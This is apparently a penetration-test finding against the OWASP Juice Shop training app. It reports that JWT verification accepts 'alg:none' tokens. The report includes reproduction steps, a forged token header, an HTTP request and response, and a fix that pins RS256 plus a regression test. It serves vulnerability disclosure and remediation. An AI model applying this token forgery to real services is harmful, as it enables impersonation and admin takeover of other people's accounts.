# JWT `alg:none` accepted — complete authentication bypass

- **Severity:** critical
- **Date (UTC):** 2026-11-18

## Details

## Summary
Juice Shop's JWT verification on `/api/*` endpoints accepts tokens with `"alg":"none"` and an empty signature. An attacker can forge arbitrary identity and role claims (including `role:"admin"`) and gain full API access without ever possessing a signing key.

## Steps to reproduce
1. Register + log in a disposable test user to obtain a legitimately-issued RS256 JWT for `id=26, role=customer`.
2. Decode the token, keep the payload unchanged, replace the header with `{"alg":"none","typ":"JWT"}` (base64url: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`).
3. Build the forged token as `<new-header>.<original-payload>.` (trailing dot, empty signature).
4. Send `GET /api/Users/26` with `Authorization: Bearer <forged-token>`.
5. Observe 200 OK with the full user record.

## Evidence
Forged token (header + payload, empty sig):
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJkYXRhIjp7ImlkIjoyNiwi...iaWF0IjoxNzk1MDE5NzgyfQ.
```

Request:
```http
GET /api/Users/26 HTTP/1.1
Host: localhost:3000
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<payload>.
```

Response (200 OK):
```json
{"status":"success","data":{"id":26,"username":"pentest","email":"pentest-juice-shop@example.com","role":"customer","isActive":true,...}}
```

Server also reflected the forged token back as `Set-Cookie: token=<forged>; Path=/`, further propagating the invalid credential.

## Impact
Complete authentication bypass. An unauthenticated attacker can:
- Forge a token for any `id` to impersonate any user.
- Elevate privilege by setting `data.role` to `"admin"` and reach `/rest/admin/*`.
- Bypass every express-jwt-gated API route (/api/Users, /api/BasketItems, /api/Addresss, /api/Feedbacks, etc.).

No signing key material is required. This is the highest-severity auth defect class in the JWT family (RFC 7518 §3.6 explicitly warns against trusting the `alg` claim).

## Remediation
- In `lib/insecurity.js`, change `jwt.verify(token, publicKey)` to `jwt.verify(token, publicKey, { algorithms: ['RS256'] })`. This pins the verifier to the asymmetric algorithm the issuer uses and forces rejection of `alg:none`, `HS256`, and any other confusion variant.
- Remove any code path that selects the verification algorithm from the token's own header.
- Add an integration test that fires a forged `alg:none` token against a gated endpoint and asserts 401.

## References
- RFC 7518 §3.6 (`none` algorithm, security considerations)
- CWE-347: Improper Verification of Cryptographic Signature
- Auth0 blog: "Critical vulnerabilities in JSON Web Token libraries" (2015)
- OWASP ASVS V3.5.3 (verify JWT algorithm allow-list)

